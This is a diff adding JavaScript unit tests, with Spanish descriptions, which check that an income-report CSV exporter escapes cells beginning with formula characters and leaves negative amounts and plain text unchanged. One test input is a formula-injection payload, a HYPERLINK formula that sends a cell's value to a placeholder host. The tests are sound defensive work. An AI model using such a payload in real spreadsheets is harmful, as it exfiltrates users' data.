@@ -84,3 +84,22 @@ describe("B2 · las alertas de seguridad de cuentas solo las ve la dueña", () =
     );
   });
 });
+
+describe("B1 · el CSV de ingresos neutraliza fórmulas en celdas de texto", () => {
+  it("antepone ' a texto que empieza con = + - @ tabulación o retorno", async () => {
+    const { csvCell } = await import("../apps/api/src/income-report");
+    expect(csvCell('=HYPERLINK("http://x/?d="&A2,"ver")')).toBe(
+      `"'=HYPERLINK(""http://x/?d=""&A2,""ver"")"`,
+    );
+    expect(csvCell("+1 809")).toBe("'+1 809");
+    expect(csvCell("-cmd")).toBe("'-cmd");
+    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
+    expect(csvCell("\tx")).toBe("'\tx");
+  });
+  it("los importes negativos y el texto normal no cambian", async () => {
+    const { csvCell } = await import("../apps/api/src/income-report");
+    expect(csvCell("-125.50")).toBe("-125.50");
+    expect(csvCell("Banco Popular")).toBe("Banco Popular");
+    expect(csvCell(null)).toBe("");
+  });
+});
